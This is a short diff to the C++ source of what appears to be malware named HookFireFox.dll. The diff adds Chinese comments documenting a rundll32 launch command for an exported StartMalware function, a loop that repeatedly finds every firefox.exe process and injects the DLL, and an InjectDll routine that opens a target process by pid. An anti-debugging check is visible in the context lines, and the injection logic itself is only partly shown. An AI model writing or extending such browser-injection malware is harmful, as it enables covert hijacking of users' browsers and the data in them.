@@ -5,6 +5,8 @@
 //#include "persistence.h"
 #include "utils.h"
 
+// rundll32.exe HookFireFox.dll,StartMalware
+// 匯出的注入函數，將 HookFireFox.dll 持續注入到 firefox.exe 中
 extern "C" __declspec(dllexport) void CALLBACK StartMalware(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
 {
     if (IsDebuggerPresent()) {
@@ -29,6 +31,7 @@ BOOL VectorContain(std::vector<DWORD> vec, DWORD val)
     return FALSE;
 }
 
+// 注入 dll 的函數，會不斷擷取當前找到的所有 firefox.exe 的 process，然後注入 dll
 BOOL RepeatInjectTargets()
 {
     Log("log.txt", "[+] loader: start injecting.\n");
@@ -47,6 +50,7 @@ BOOL RepeatInjectTargets()
     }
 }
 
+// 注入指定 pid 的 process，dllPath 的 dll
 BOOL InjectDll(DWORD pid, const std::wstring& dllPath)
 {
     // 1. OpenProcess 開啟目標 Process
